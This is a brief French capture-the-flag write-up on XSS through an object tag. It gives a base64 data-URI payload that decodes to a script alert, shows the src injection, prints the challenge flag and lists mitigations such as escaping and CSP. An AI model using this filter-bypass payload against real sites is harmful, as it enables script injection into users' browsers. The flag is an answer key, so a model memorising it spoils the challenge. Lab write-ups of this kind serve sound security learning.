https://cubalo.github.io/blog/2014/01/04/bypassing-xss-filters-using-data-uris/
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
https://developer.mozilla.org/fr/docs/Web/HTTP/Guides/CSP

Dans l'object : 
data:text/html;base64 PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

Les URL sont de la forme: données : [<type de média>][base64],<données> donc on teste dans src :
src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

Comment l'eviter: 
- Whitelist pour les url sures, afin d'eviter des mauvaises sources pour les objets chargees.
- iframe pour du contenu externe
- entrees utilisateurs doivent etre echappees
- CSP (content security policy) pour les balises object